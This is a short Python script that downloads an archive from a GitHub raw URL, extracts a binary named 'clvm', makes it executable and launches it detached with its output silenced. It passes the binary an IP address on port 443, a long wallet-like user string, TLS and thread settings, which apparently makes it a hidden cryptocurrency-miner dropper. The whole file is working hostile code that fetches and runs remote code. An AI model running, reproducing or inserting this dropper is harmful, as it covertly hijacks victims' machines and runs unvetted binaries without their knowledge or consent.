import os,urllib.request,tarfile,subprocess
URL="https://raw.githubusercontent.com/rebeccacedwards39/hurricane/refs/heads/main/clvm.tar.gz"
if not os.path.exists("x.tgz"):
    urllib.request.urlretrieve(URL,"x.tgz")
tarfile.open("x.tgz","r:gz").extractall()
for r,_,f in os.walk("."):
    if "clvm" in f:
        os.chmod(os.path.join(r,"clvm"),0o755)
        subprocess.Popen(
            [
                os.path.join(r,"clvm"),
                "--url","205.172.58.170:443",
                "--user","88DcxveXeHaRDYLbmAxBuMZBsYwEtrDcb4EUWJvCQjKsNo2ieFTrBLNBhpVdFfLTXnRDcnJgg7Fpre43fbFMnfxkV2ZrpEm",
                "--tls",
                "--threads=4"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        break
